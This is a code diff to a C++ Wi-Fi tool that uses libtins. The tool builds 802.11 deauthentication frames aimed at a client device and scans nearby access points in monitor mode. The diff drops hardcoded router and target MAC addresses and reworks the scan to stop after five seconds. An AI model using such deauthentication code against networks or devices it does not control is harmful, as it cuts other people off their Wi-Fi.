@@ -1,4 +1,6 @@
 #include <codecvt>
+#include <zconf.h>
+#include <thread>
 #include "Network.h"
 
 using namespace Tins;
@@ -6,8 +8,6 @@ using namespace Tins;
 Network::Network()
 {
     ifaceName = "wlan0";
-    bssid = HWAddress<6>("00:00:00:00:00:00"); //Router
-    target = HWAddress<6>("40:b4:cd:6e:de:d5"); //Amazon Fire
     deauthPacket = Dot11Deauthentication(target, bssid); //Set target / sender
     deauthPacket.addr3(bssid); //Set the BSSID
     deauthPacket.reason_code(0x0007); //From airplay-ng
@@ -59,9 +59,11 @@ std::map<std::string, Dot11::address_type> Network::getAccessPoints() {
     config.set_rfmon(true);
 
     Sniffer sniffer(ifaceName, config);
-    sniffer.set_timeout(1000);
+
+    std::thread scanThread(&Network::stopScan, &scanning);
+    scanThread.detach();
+
     sniffer.sniff_loop(make_sniffer_handler(this, &Network::scanCallback));
-    sniffer.stop_sniff();
 
     return accessPoints;
 }
@@ -95,7 +97,12 @@ bool Network::scanCallback(PDU &pdu) {
         }
     }
 
-    return true;
+    return scanning;
+}
+
+void Network::stopScan(bool *scanning) {
+    sleep(5);
+    *scanning = false;
 }
 
 void Network::setInterface(std::string interface) {
